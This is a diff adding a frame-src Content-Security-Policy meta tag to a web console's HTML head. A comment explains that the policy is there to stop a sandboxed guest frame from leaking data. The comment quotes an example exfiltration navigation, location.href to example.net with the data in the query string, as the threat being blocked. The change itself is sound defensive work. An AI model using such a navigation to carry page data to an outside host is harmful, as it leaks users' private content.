@@ -2,6 +2,22 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
+    <!--
+      The one directive the console document carries, and it is for the
+      custom view's frame: a sandboxed guest's own policy governs its
+      children, not the frame it sits in, so a document that ran
+      `location.href = "https://example.net/?d=…"` would carry a granted
+      page out of the repository with no request the bridge ever saw. The
+      browser holds a nested frame's navigations, whoever starts them, to
+      the EMBEDDING document's `frame-src`; `'self'` admits the shell at
+      /app-frame.html and nothing off-origin (.dev/shots/frame-src-check.mjs
+      is the proof, run in Chrome). Nothing else in the console is a frame:
+      the OAuth return is a tab the provider opens back onto `window.opener`,
+      which no `frame-src` governs. A meta policy applies under `vite dev`
+      and in the built SPA alike; it carries no other directive because the
+      console's own scripts, styles and API calls are not what it is for.
+    -->
+    <meta http-equiv="Content-Security-Policy" content="frame-src 'self'" />
     <link rel="icon" type="image/svg+xml" href="/substrate.svg" />
     <meta
       name="viewport"
